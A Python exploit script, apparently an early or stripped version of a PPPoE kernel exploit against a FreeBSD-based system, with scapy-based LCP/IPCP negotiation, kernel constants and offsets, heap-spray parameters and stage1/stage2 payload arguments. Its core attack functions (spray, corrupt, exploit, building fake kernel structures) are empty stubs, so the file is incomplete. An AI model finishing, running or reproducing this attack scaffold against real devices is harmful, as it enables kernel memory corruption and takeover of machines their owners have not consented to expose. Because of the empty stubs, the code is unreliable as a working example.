#!/usr/bin/env python3
#
# Copyright (C) 2024 Andy Nguyen
#
# This software may be modified and distributed under the terms
# of the MIT license. See the LICENSE file for details.

from argparse import ArgumentParser
from scapy.all import *
from scapy.layers.ppp import *
from struct import pack, unpack
from sys import exit
from time import sleep
from offsets import *

# PPPoE constants

PPPOE_TAG_HUNIQUE = 0x0103
PPPOE_TAG_ACOOKIE = 0x0104

PPPOE_CODE_PADI = 0x09
PPPOE_CODE_PADO = 0x07
PPPOE_CODE_PADR = 0x19
PPPOE_CODE_PADS = 0x65
PPPOE_CODE_PADT = 0xa7

ETHERTYPE_PPPOEDISC = 0x8863
ETHERTYPE_PPPOE = 0x8864

CONF_REQ = 1
CONF_ACK = 2
CONF_NAK = 3
CONF_REJ = 4
ECHO_REQ = 9
ECHO_REPLY = 10

# FreeBSD constants

NULL = 0

PAGE_SIZE = 0x4000

IDT_UD = 6
SDT_SYSIGT = 14
SEL_KPL = 0

CR0_PE = 0x00000001
CR0_MP = 0x00000002
CR0_EM = 0x00000004
CR0_TS = 0x00000008
CR0_ET = 0x00000010
CR0_NE = 0x00000020
CR0_WP = 0x00010000
CR0_AM = 0x00040000
CR0_NW = 0x20000000
CR0_CD = 0x40000000
CR0_PG = 0x80000000

CR0_ORI = CR0_PG | CR0_AM | CR0_WP | CR0_NE | CR0_ET | CR0_TS | CR0_MP | CR0_PE

VM_PROT_READ = 0x01
VM_PROT_WRITE = 0x02
VM_PROT_EXECUTE = 0x04

VM_PROT_ALL = VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE

LLE_STATIC = 0x0002
LLE_LINKED = 0x0040
LLE_EXCLUSIVE = 0x2000

LO_INITIALIZED = 0x00010000
LO_WITNESS = 0x00020000
LO_UPGRADABLE = 0x00200000
LO_DUPOK = 0x00400000

LO_CLASSSHIFT = 24

RW_UNLOCKED = 1
MTX_UNOWNED = 4

RW_INIT_FLAGS = (4 << LO_CLASSSHIFT) | LO_INITIALIZED | LO_WITNESS | LO_UPGRADABLE
MTX_INIT_FLAGS = (1 << LO_CLASSSHIFT) | LO_INITIALIZED | LO_WITNESS

CALLOUT_RETURNUNLOCKED = 0x10

AF_INET6 = 28

IFT_ETHER = 0x6

ND6_LLINFO_NOSTATE = 0xfffe

# FreeBSD offsets

TARGET_SIZE = 0x100

PPPOE_SOFTC_SC_DEST = 0x24
PPPOE_SOFTC_SC_AC_COOKIE = 0x40
PPPOE_SOFTC_SIZE = 0x1c8

LLTABLE_LLTIFP = 0x110
LLTABLE_LLTFREE = 0x118

SOCKADDR_IN6_SIZE = 0x1c


def p8(val):
    return pack('<B', val & 0xff)


def p16(val):
    return pack('<H', val & 0xffff)


def p16be(val):
    return pack('>H', val & 0xffff)


def p32(val):
    return pack('<I', val & 0xffffffff)


def p32be(val):
    return pack('>I', val & 0xffffffff)


def p64(val):
    return pack('<Q', val & 0xffffffffffffffff)


def p64be(val):
    return pack('>Q', val & 0xffffffffffffffff)


class LcpEchoHandler(AsyncSniffer):

    def __init__(self, iface):
        self.s = conf.L2socket(iface=iface)
        super().__init__(opened_socket=self.s,
                         prn=self.handler,
                         filter='pppoes && !ip',
                         lfilter=lambda pkt: pkt.haslayer(PPP_LCP_Echo))

    def handler(self, pkt):
        self.s.send(
            Ether(src=pkt[Ether].dst, dst=pkt[Ether].src, type=ETHERTYPE_PPPOE)
            / PPPoE(sessionid=pkt[PPPoE].sessionid) / PPP() /
            PPP_LCP_Echo(code=ECHO_REPLY, id=pkt[PPP_LCP_Echo].id))


class Exploit:
    SPRAY_NUM = 0x1000
    PIN_NUM = 0x1000
    CORRUPT_NUM = 0x1

    HOLE_START = 0x400
    HOLE_SPACE = 0x10

    LCP_ID = 0x41
    IPCP_ID = 0x41

    SESSION_ID = 0xffff

    STAGE2_PORT = 9020

    SOURCE_MAC = '41:41:41:41:41:41'
    SOURCE_IPV4 = '41.41.41.41'
    SOURCE_IPV6 = 'fe80::4141:4141:4141:4141'

    TARGET_IPV4 = '42.42.42.42'

    BPF_FILTER = '(ip6) || (pppoed) || (pppoes && !ip)'

    def __init__(self, offs, iface, stage1, stage2):
        self.offs = offs
        self.iface = iface
        self.stage1 = stage1
        self.stage2 = stage2
        self.s = conf.L2socket(iface=self.iface, filter=self.BPF_FILTER)

    def kdlsym(self, addr):
        return self.kaslr_offset + addr

    def lcp_negotiation(self):
        print('[*] Sending LCP configure request...')
        self.s.send(
            Ether(src=self.source_mac,
                  dst=self.target_mac,
                  type=ETHERTYPE_PPPOE) / PPPoE(sessionid=self.SESSION_ID) /
            PPP() / PPP_LCP(code=CONF_REQ, id=self.LCP_ID))

        print('[*] Waiting for LCP configure ACK...')
        while True:
            pkt = self.s.recv()
            if pkt and pkt.haslayer(PPP_LCP_Configure) and pkt[
                    PPP_LCP_Configure].code == CONF_ACK:
                break

        print('[*] Waiting for LCP configure request...')
        while True:
            pkt = self.s.recv()
            if pkt and pkt.haslayer(PPP_LCP_Configure) and pkt[
                    PPP_LCP_Configure].code == CONF_REQ:
                break

        print('[*] Sending LCP configure ACK...')
        self.s.send(
            Ether(src=self.source_mac,
                  dst=self.target_mac,
                  type=ETHERTYPE_PPPOE) / PPPoE(sessionid=self.SESSION_ID) /
            PPP() / PPP_LCP(code=CONF_ACK, id=pkt[PPP_LCP_Configure].id))

    def ipcp_negotiation(self):
        print('[*] Sending IPCP configure request...')
        self.s.send(
            Ether(
                src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOE)
            / PPPoE(sessionid=self.SESSION_ID) / PPP() /
            PPP_IPCP(code=CONF_REQ,
                     id=self.IPCP_ID,
                     options=PPP_IPCP_Option_IPAddress(data=self.SOURCE_IPV4)))

        print('[*] Waiting for IPCP configure ACK...')
        while True:
            pkt = self.s.recv()
            if pkt and pkt.haslayer(
                    PPP_IPCP) and pkt[PPP_IPCP].code == CONF_ACK:
                break

        print('[*] Waiting for IPCP configure request...')
        while True:
            pkt = self.s.recv()
            if pkt and pkt.haslayer(
                    PPP_IPCP) and pkt[PPP_IPCP].code == CONF_REQ:
                break

        print('[*] Sending IPCP configure NAK...')
        self.s.send(
            Ether(
                src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOE)
            / PPPoE(sessionid=self.SESSION_ID) / PPP() /
            PPP_IPCP(code=CONF_NAK,
                     id=pkt[PPP_IPCP].id,
                     options=PPP_IPCP_Option_IPAddress(data=self.TARGET_IPV4)))

        print('[*] Waiting for IPCP configure request...')
        while True:
            pkt = self.s.recv()
            if pkt and pkt.haslayer(
                    PPP_IPCP) and pkt[PPP_IPCP].code == CONF_REQ:
                break

        print('[*] Sending IPCP configure ACK...')
        self.s.send(
            Ether(src=self.source_mac,
                  dst=self.target_mac,
                  type=ETHERTYPE_PPPOE) / PPPoE(sessionid=self.SESSION_ID) /
            PPP() / PPP_IPCP(code=CONF_ACK,
                             id=pkt[PPP_IPCP].id))

    def build_fake_ifnet(self):
        # Build fake ifnet
        return bytes()

    def build_overflow_lle(self):
        # Build overflow lle
        return bytes()

    def build_fake_lle(self):
        # Build fake lle
        return bytes()

    def spray(self):
        # Spray packets
        pass

    def corrupt(self):
        # Corrupt
        pass

    def exploit(self):
        # Exploit
        pass


if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument('-i', '--iface', required=True, help='Interface')
    parser.add_argument('-s1', '--stage1', required=True, help='Stage 1')
    parser.add_argument('-s2', '--stage2', required=True, help='Stage 2')
    args = parser.parse_args()

    exploit = Exploit(OFFSETS, args.iface, args.stage1, args.stage2)
    exploit.exploit()

